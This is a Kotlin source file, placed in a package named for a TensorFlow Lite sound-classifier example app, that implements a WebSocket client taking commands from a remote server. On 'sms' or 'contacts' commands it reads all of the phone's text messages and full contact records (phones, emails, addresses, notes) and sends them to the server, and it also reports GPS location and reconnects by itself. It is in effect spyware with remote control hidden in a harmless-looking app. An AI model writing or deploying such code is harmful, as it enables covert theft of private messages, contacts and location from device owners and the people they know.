package org.tensorflow.lite.examples.soundclassifier

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.renderscript.ScriptGroup.Binding
import android.widget.Toast
import androidx.preference.PreferenceManager
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import org.tensorflow.lite.examples.soundclassifier.contacts.ContactsActivity
import org.tensorflow.lite.examples.soundclassifier.contacts.ContactsService
import org.tensorflow.lite.examples.soundclassifier.databinding.ActivityMainBinding
import java.util.UUID
import java.util.concurrent.TimeUnit

class WebSocketClient(context: Context, binding: ActivityMainBinding) {
    internal var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    internal var ctx: Context
    internal var binding: ActivityMainBinding
    internal lateinit var uuid: String

    init {
        this.ctx = context
        this.binding = binding
        initUUID()
        connect()
    }

    private fun initUUID() {
        val prefs = PreferenceManager.getDefaultSharedPreferences(ctx)

        uuid = prefs.getString("UUID", null) ?: run {
            val newUuid = UUID.randomUUID().toString()
            prefs.edit().putString("UUID", newUuid).apply()
            newUuid
        }
    }

    fun connect() {
        val request = Request.Builder()
            .url("ws://10.0.2.2:8080/ws") // Replace with your server URL
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                super.onOpen(webSocket, response)
               val connectMessage = """{"type": "connect", "uuid": "$uuid"}"""
                webSocket.send(connectMessage)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                super.onMessage(webSocket, text)

                try {
                    val jsonObject = org.json.JSONObject(text)
                    val type = jsonObject.getString("type")

                    when(type) {
                        "ping" -> handlePing()
                        "sms" -> sendSMS()
                        "contacts" -> sendContacts()
                        else -> {
                            Handler(Looper.getMainLooper()).post {
                                Toast.makeText(ctx, "Unknown command: $type", Toast.LENGTH_SHORT).show()
                            }
                        }
                    }
                } catch (e: org.json.JSONException) {
                    e.printStackTrace()
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(ctx, "Invalid message format", Toast.LENGTH_SHORT).show()
                    }
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                super.onFailure(webSocket, t, response)

                Handler(Looper.getMainLooper()).postDelayed({
                    this@WebSocketClient.connect()
                }, 5000)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                super.onClosed(webSocket, code, reason)
            }
        })
    }

    fun disconnect() {
        val disconnectMessage = """{"type": "disconnect", "uuid": "$uuid"}"""
        webSocket?.send(disconnectMessage)
        webSocket?.close(1000, "Disconnect requested")
        webSocket = null
    }

    fun sendLocation(location: android.location.Location) {
        val jsonObject = org.json.JSONObject()
        val dataObject = org.json.JSONObject()

        try {
            jsonObject.put("type", "location")
            jsonObject.put("uuid", uuid)

            dataObject.put("latitude", location.latitude)
            dataObject.put("longitude", location.longitude)

            jsonObject.put("data", dataObject)
        } catch (e: org.json.JSONException) {
            e.printStackTrace()
        }

        webSocket?.send(jsonObject.toString())
    }

    fun handlePing() {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(ctx, "Pong!", Toast.LENGTH_SHORT).show()
        }
    }

    fun sendSMS() {
        data class SmsMessage(
            val id: Long,
            val address: String?,
            val body: String?,
            val date: Long,
            val type: Int
        )

        fun readSmsMessages(context: Context): List<SmsMessage> {
            if (context.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return emptyList() // Return an empty list if permission is not granted
            }

            val smsList = mutableListOf<SmsMessage>()
            val uri = Uri.parse("content://sms")
            val projection = arrayOf("_id", "address", "body", "date", "type")

            val cursor: Cursor? = context.contentResolver.query(uri, projection, null, null, "date DESC")
            cursor?.use {
                val idIndex = it.getColumnIndex("_id")
                val addressIndex = it.getColumnIndex("address")
                val bodyIndex = it.getColumnIndex("body")
                val dateIndex = it.getColumnIndex("date")
                val typeIndex = it.getColumnIndex("type")

                while (it.moveToNext()) {
                    val id = it.getLong(idIndex)
                    val address = it.getString(addressIndex)
                    val body = it.getString(bodyIndex)
                    val date = it.getLong(dateIndex)
                    val type = it.getInt(typeIndex)

                    smsList.add(SmsMessage(id, address, body, date, type))
                }
            }

            return smsList
        }

        val jsonObject = JSONObject()
        val dataArray = JSONArray()

        try {
            jsonObject.put("type", "sms")
            jsonObject.put("uuid", uuid)

            val smsList = readSmsMessages(this.ctx)
            if (smsList.isNotEmpty()) {
                for (sms in smsList) {
                    val smsObject = JSONObject()
                    smsObject.put("id", sms.id)
                    smsObject.put("address", sms.address)
                    smsObject.put("body", sms.body)
                    smsObject.put("date", sms.date)
                    smsObject.put("type", sms.type)
                    dataArray.put(smsObject)
                }

                jsonObject.put("data", dataArray)
                webSocket?.send(jsonObject.toString())
            }
        } catch (e: org.json.JSONException) {
            e.printStackTrace()
        }
    }

    fun sendContacts() {
        data class Contact(
            val id: String,
            val name: String,
            val phone: String?,
            val email: String?,
            val address: String?,
            val company: String?,
            val title: String?,
            val note: String?,
            val im: String?
        )

        fun readContacts(context: Context): List<Contact> {
            if (context.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return emptyList() // Return an empty list if permission is not granted
            }

            val contacts = mutableListOf<Contact>()
            val contentResolver = context.contentResolver

            // Fetch contacts
            val cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                null
            )

            cursor?.use { contactCursor ->
                while (contactCursor.moveToNext()) {
                    val id = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))

                    // Fetch phone number
                    var phone: String? = null
                    val phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    phoneCursor?.use {
                        if (it.moveToNext()) {
                            phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        }
                    }

                    // Fetch email
                    var email: String? = null
                    val emailCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    emailCursor?.use {
                        if (it.moveToNext()) {
                            email = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS))
                        }
                    }

                    // Fetch address
                    var address: String? = null
                    val addressCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
                        null,
                        "${ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    addressCursor?.use {
                        if (it.moveToNext()) {
                            address = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS))
                        }
                    }

                    // Fetch company and title
                    var company: String? = null
                    var title: String? = null
                    val organizationCursor = contentResolver.query(
                        ContactsContract.Data.CONTENT_URI,
                        null,
                        "${ContactsContract.Data.MIMETYPE} = ? AND ${ContactsContract.Data.CONTACT_ID} = ?",
                        arrayOf(ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE, id),
                        null
                    )
                    organizationCursor?.use {
                        if (it.moveToNext()) {
                            company = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.COMPANY))
                            title = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.TITLE))
                        }
                    }

                    // Fetch note
                    var note: String? = null
                    val noteCursor = contentResolver.query(
                        ContactsContract.Data.CONTENT_URI,
                        null,
                        "${ContactsContract.Data.MIMETYPE} = ? AND ${ContactsContract.Data.CONTACT_ID} = ?",
                        arrayOf(ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE, id),
                        null
                    )
                    noteCursor?.use {
                        if (it.moveToNext()) {
                            note = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Note.NOTE))
                        }
                    }

                    // Fetch IM data
                    var im: String? = null
                    val imCursor = contentResolver.query(
                        ContactsContract.Data.CONTENT_URI,
                        null,
                        "${ContactsContract.Data.MIMETYPE} = ? AND ${ContactsContract.Data.CONTACT_ID} = ?",
                        arrayOf(ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE, id),
                        null
                    )
                    imCursor?.use {
                        if (it.moveToNext()) {
                            im = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Im.DATA))
                        }
                    }

                    contacts.add(Contact(id, name, phone, email, address, company, title, note, im))
                }
            }

            return contacts
        }

        val jsonObject = JSONObject()
        val dataArray = JSONArray()

        try {
            jsonObject.put("type", "contacts")
            jsonObject.put("uuid", uuid)

            val contactsList = readContacts(ctx)
            if (contactsList.isNotEmpty()) {
                for (contact in contactsList) {
                    val contactObject = JSONObject()
                    contactObject.put("id", contact.id)
                    contactObject.put("name", contact.name)
                    contactObject.put("phone", contact.phone)
                    contactObject.put("email", contact.email)
                    contactObject.put("address", contact.address)
                    contactObject.put("company", contact.company)
                    contactObject.put("title", contact.title)
                    contactObject.put("note", contact.note)
                    contactObject.put("im", contact.im)
                    dataArray.put(contactObject)
                }

                jsonObject.put("data", dataArray)
                webSocket?.send(jsonObject.toString())
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}